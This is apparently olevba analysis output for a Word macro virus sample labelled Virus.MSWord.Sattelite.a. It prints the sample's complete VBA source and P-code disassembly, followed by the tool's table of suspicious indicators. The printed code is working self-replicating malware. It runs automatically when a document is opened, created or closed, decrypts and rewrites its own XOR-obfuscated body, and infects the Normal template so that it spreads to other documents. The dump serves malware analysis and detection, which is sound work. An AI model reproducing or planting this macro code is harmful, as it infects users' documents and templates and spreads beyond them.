olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sattelite.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sattelite.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




































































































































Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Const REG_SZ As Long = 1
Const HKEY_CURRENT_USER As Long = &H80000001
Const HKEY_LOCAL_MACHINE As Long = &H80000002
Private Sub Document_New()
Call Document_Open
End Sub
'Sattelite v1.5
'Document
Private Function encr(s, k As Integer)
Dim r: r = "": For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next: encr = r
End Function
Private Sub Document_Open()
On Error Resume Next: W = 0: CH = Word.ActiveDocument.Characters.Count: Kar = "'" + Str(CH)
WhereAmI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(143, 1)
If WhereAmI = "'NormalTemplate" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Iam: .ReplaceLine 204, Kar: Z = .CountOfLines - 29: For X = 162 To Z:
If W = 20 Then W = 0
decrypt = .Lines(X, 1): W = W + 2: Y = Len(decrypt): Y = Y - 1: decrypt = Right$(decrypt, Y): .ReplaceLine X + 21, encr(decrypt, (W)): Next X: End With
Call ThisDoc: Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule: Flag = 0: GoTo over
Again: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule: Flag = 1
over:
With Iam: For X = 183 To 203: .ReplaceLine X, "'": Next X: End With
If Flag = 0 Then GoTo Again:
NormalTemplate.Save
End Sub
Private Sub ThisDoc()
'Ml"Gppmp"Pgqwog"Lgzv
'Etthmgepmkj*AjefhaGejgahOa}$9$s`Gejgah@mwefha`
'Ivroihu(PotsuVtirceroih&;&@gjuc
'Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m
'Yo~*Ki~Ikxxcox*7*Ki~c|oNeigod~$\HZxe`oi~$\HIegzedod~y";#$IenoGenfo
'_ix,Bc~aOm~~ei~,1,Bc~am`Xia|`mxi"ZN\~cfiox"ZNOca|cbibx$=%"OchiAchy`i
'@G.3.@a|cobZkc~bozk XL^|adkmz XLMac~a`k`z}&?' MajkCaj{bk Bg`k}&?:<".?'
'QY0-0QsdyfuTse}u~d>FR@bzusd>FRS}`~u~dc8!9>Stu]te|u>\y~uc8!$"<0!9
'[t2GQsaw:\[;2/205ASFFW^[FW2D#<'02Fzw|2\}`[|afs~~wv2/2F`gw2W~aw2\}`[|afs~~wv2/2Ts~aw
']r4AWugq<Z]=4(*463GU@@QX]@Q4B%:!64Uzp4Z{fyWuff}qf:W{az`[rX}zqg4*4$4@|qz4Ql}`4Gav
'Kd"WAcqg*CK+"?" %QCVVGNKVG"T3,7 "Vjgl"CavKlqvcnngf"?"Vpwg"Gnqg"CavKlqvcnngf"?"Dcnqg
'Mb$QGewa,EM-$8:$&#WEPPAHMPA$R5*1&$Ej`$EgpGevvmav*GkqjpKbHmjaw$:$4$Plaj$A|mp$Wqf
'O`&HitkOhurgjjcb&;&Rtsc&Ghb&GerOhurgjjcb&;&Rtsc&Rnch&C~or&Usd
'An(FgzeAf{|iddml(5(Nid{m(\`mf2([m|(Afnmk|agf(5(FgzeKizzamz2([m|(Kizzamz(5(Ik|Kizzamz2(Md{m2([m|(Afnmk|agf(5(Ik|Kizzamz2([m|(Kizzamz(5(FgzeKizzamz
']c~b*Ikxxcox0*\cxIeno*7*$Fcdoy";&*$Ied~ElFcdoy#0*Odn*]c~b
'[exd,Ebjioxecb6,"Hi`ixi@ebi,= ,"OcybxCj@ebi6,"Ebi~x@ebi,= ,Ze~Ochi
'Gh.@a|cG`}zobbkj.3.Hob}k.Zfk`. \k~bomkBg`k.?:=".,)@a|cobZkc~bozk,.Kb}k. \k~bomkBg`k.?:=".,)Jam{ck`z,
'e0-0Buw_`u~[uiUhQ8X[UIO\_SQ\O]QSXY^U<02CvdgqbuL]ysbcvdLGy~tgcLSebbu~dFubcy~2<0 <0[UIOQ\\OQSSUCC<0{9
'g2/2@wuAwfDs~gwWjS:y>20@wu{afw`wv]e|w`0>2">2@WUMAH>20FzW2eW{@v2Uw\{Ga0>2#;
'a4)4FqsWx{gq_qm<=
'Glf"Ukvj"
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
' 39
End Sub
Private Sub Document_Close()
WhereAmI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(143, 1): CH = Word.ActiveDocument.Characters.Count: Kar = "'" + Str(CH)
If WhereAmI = "'NormalTemplate" Then Set Iam = NormalTemplate.VBProject.VBComponents(1).CodeModule Else: Set Iam = ActiveDocument.VBProject.VBComponents(1).CodeModule:
Kar2 = Iam.Lines(204, 1): Iam.ReplaceLine 204, "'": NormalTemplate.Saved = True: If Kar = Kar2 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Sattelite.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11443 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #133:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #134:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #135:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ (As Long)
' Line #136:
' 	Dim (Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #137:
' 	Dim (Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #138:
' 	FuncDefn (Private Sub Document_New())
' Line #139:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #140:
' 	EndSub 
' Line #141:
' 	QuoteRem 0x0000 0x000E "Sattelite v1.5"
' Line #142:
' 	QuoteRem 0x0000 0x0008 "Document"
' Line #143:
' 	FuncDefn (Private Function encr(s, k As Integer, id_FFFE As Variant))
' Line #144:
' 	Dim 
' 	VarDefn r
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St r 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld r 
' 	Ld s 
' 	Ld False 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Paren 
' 	Ld k 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St r 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	Ld r 
' 	St encr 
' Line #145:
' 	EndFunc 
' Line #146:
' 	FuncDefn (Private Sub Document_Open())
' Line #147:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St W 
' 	BoS 0x0000 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	St CH 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	Ld CH 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St Kar 
' Line #148:
' 	LitDI2 0x008F 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St WhereAmI 
' Line #149:
' 	Ld WhereAmI 
' 	LitStr 0x000F "'NormalTemplate"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	EndIf 
' Line #150:
' 	StartWithExpr 
' 	Ld Iam 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x00CC 
' 	Ld Kar 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x001D 
' 	Sub 
' 	St Z 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x00A2 
' 	Ld Z 
' 	For 
' 	BoS 0x0000 
' Line #151:
' 	Ld W 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St W 
' 	EndIf 
' Line #152:
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St decrypt 
' 	BoS 0x0000 
' 	Ld W 
' 	LitDI2 0x0002 
' 	Add 
' 	St W 
' 	BoS 0x0000 
' 	Ld decrypt 
' 	FnLen 
' 	St Y 
' 	BoS 0x0000 
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Y 
' 	BoS 0x0000 
' 	Ld decrypt 
' 	Ld Y 
' 	ArgsLd Right$ 0x0002 
' 	St decrypt 
' 	BoS 0x0000 
' 	Ld X 
' 	LitDI2 0x0015 
' 	Add 
' 	Ld decrypt 
' 	Ld W 
' 	Paren 
' 	ArgsLd encr 0x0002 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndWith 
' Line #153:
' 	ArgsCall (Call) ThisDoc 0x0000 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St Flag 
' 	BoS 0x0000 
' 	GoTo over 
' Line #154:
' 	Label Again 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Flag 
' Line #155:
' 	Label over 
' Line #156:
' 	StartWithExpr 
' 	Ld Iam 
' 	With 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x00B7 
' 	LitDI2 0x00CB 
' 	For 
' 	BoS 0x0000 
' 	Ld X 
' 	LitStr 0x0001 "'"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndWith 
' Line #157:
' 	Ld Flag 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Again 
' 	BoS 0x0000 
' 	EndIf 
' Line #158:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #159:
' 	EndSub 
' Line #160:
' 	FuncDefn (Private Sub ThisDoc())
' Line #161:
' 	QuoteRem 0x0000 0x0014 "Ml"Gppmp"Pgqwog"Lgzv"
' Line #162:
' 	QuoteRem 0x0000 0x002E "Etthmgepmkj*AjefhaGejgahOa}$9$s`Gejgah@mwefha`"
' Line #163:
' 	QuoteRem 0x0000 0x001F "Ivroihu(PotsuVtirceroih&;&@gjuc"
' Line #164:
' 	QuoteRem 0x0000 0x0020 "Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m"
' Line #165:
' 	QuoteRem 0x0000 0x0044 "Yo~*Ki~Ikxxcox*7*Ki~c|oNeigod~$\HZxe`oi~$\HIegzedod~y";#$IenoGenfo"
' Line #166:
' 	QuoteRem 0x0000 0x0045 "_ix,Bc~aOm~~ei~,1,Bc~am`Xia|`mxi"ZN\~cfiox"ZNOca|cbibx$=%"OchiAchy`i"
' Line #167:
' 	QuoteRem 0x0000 0x0046 "@G.3.@a|cobZkc~bozk XL^|adkmz XLMac~a`k`z}&?' MajkCaj{bk Bg`k}&?:<".?'"
' Line #168:
' 	QuoteRem 0x0000 0x0046 "QY0-0QsdyfuTse}u~d>FR@bzusd>FRS}`~u~dc8!9>Stu]te|u>\y~uc8!$"<0!9"
' Line #169:
' 	QuoteRem 0x0000 0x0055 "[t2GQsaw:\[;2/205ASFFW^[FW2D#<'02Fzw|2\}`[|afs~~wv2/2F`gw2W~aw2\}`[|afs~~wv2/2Ts~aw"
' Line #170:
' 	QuoteRem 0x0000 0x0050 "]r4AWugq<Z]=4(*463GU@@QX]@Q4B%:!64Uzp4Z{fyWuff}qf:W{az`[rX}zqg4*4$4@|qz4Ql}`4Gav"
' Line #171:
' 	QuoteRem 0x0000 0x0053 "Kd"WAcqg*CK+"?" %QCVVGNKVG"T3,7 "Vjgl"CavKlqvcnngf"?"Vpwg"Gnqg"CavKlqvcnngf"?"Dcnqg"
' Line #172:
' 	QuoteRem 0x0000 0x004F "Mb$QGewa,EM-$8:$&#WEPPAHMPA$R5*1&$Ej`$EgpGevvmav*GkqjpKbHmjaw$:$4$Plaj$A|mp$Wqf"
' Line #173:
' 	QuoteRem 0x0000 0x003D "O`&HitkOhurgjjcb&;&Rtsc&Ghb&GerOhurgjjcb&;&Rtsc&Rnch&C~or&Usd"
' Line #174:
' 	QuoteRem 0x0000 0x0091 "An(FgzeAf{|iddml(5(Nid{m(\`mf2([m|(Afnmk|agf(5(FgzeKizzamz2([m|(Kizzamz(5(Ik|Kizzamz2(Md{m2([m|(Afnmk|agf(5(Ik|Kizzamz2([m|(Kizzamz(5(FgzeKizzamz"
' Line #175:
' 	QuoteRem 0x0000 0x003A "]c~b*Ikxxcox0*\cxIeno*7*$Fcdoy";&*$Ied~ElFcdoy#0*Odn*]c~b"
' Line #176:
' 	QuoteRem 0x0000 0x0046 "[exd,Ebjioxecb6,"Hi`ixi@ebi,= ,"OcybxCj@ebi6,"Ebi~x@ebi,= ,Ze~Ochi"
' Line #177:
' 	QuoteRem 0x0000 0x0064 "Gh.@a|cG`}zobbkj.3.Hob}k.Zfk`. \k~bomkBg`k.?:=".,)@a|cobZkc~bozk,.Kb}k. \k~bomkBg`k.?:=".,)Jam{ck`z,"
' Line #178:
' 	QuoteRem 0x0000 0x0068 "e0-0Buw_`u~[uiUhQ8X[UIO\_SQ\O]QSXY^U<02CvdgqbuL]ysbcvdLGy~tgcLSebbu~dFubcy~2<0 <0[UIOQ\\OQSSUCC<0{9"
' Line #179:
' 	QuoteRem 0x0000 0x004A "g2/2@wuAwfDs~gwWjS:y>20@wu{afw`wv]e|w`0>2">2@WUMAH>20FzW2eW{@v2Uw\{Ga0>2#;"
' Line #180:
' 	QuoteRem 0x0000 0x0012 "a4)4FqsWx{gq_qm<="
' Line #181:
' 	QuoteRem 0x0000 0x0009 "Glf"Ukvj""
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' 	QuoteRem 0x0000 0x0000 ""
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' 	QuoteRem 0x0000 0x0000 ""
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' 	QuoteRem 0x0000 0x0000 ""
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #193:
' 	QuoteRem 0x0000 0x0000 ""
' Line #194:
' 	QuoteRem 0x0000 0x0000 ""
' Line #195:
' 	QuoteRem 0x0000 0x0000 ""
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' 	QuoteRem 0x0000 0x0000 ""
' Line #199:
' 	QuoteRem 0x0000 0x0000 ""
' Line #200:
' 	QuoteRem 0x0000 0x0000 ""
' Line #201:
' 	QuoteRem 0x0000 0x0000 ""
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' 	QuoteRem 0x0000 0x0003 " 39"
' Line #204:
' 	EndSub 
' Line #205:
' 	FuncDefn (Private Sub Document_Close())
' Line #206:
' 	LitDI2 0x008F 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St WhereAmI 
' 	BoS 0x0000 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	St CH 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	Ld CH 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St Kar 
' Line #207:
' 	Ld WhereAmI 
' 	LitStr 0x000F "'NormalTemplate"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Iam 
' 	BoS 0x0000 
' 	EndIf 
' Line #208:
' 	LitDI2 0x00CC 
' 	LitDI2 0x0001 
' 	Ld Iam 
' 	ArgsMemLd Lines 0x0002 
' 	St Kar2 
' 	BoS 0x0000 
' 	LitDI2 0x00CC 
' 	LitStr 0x0001 "'"
' 	Ld Iam 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	Ld Kar 
' 	Ld Kar2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #209:
' 	EndSub 
' Line #210:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

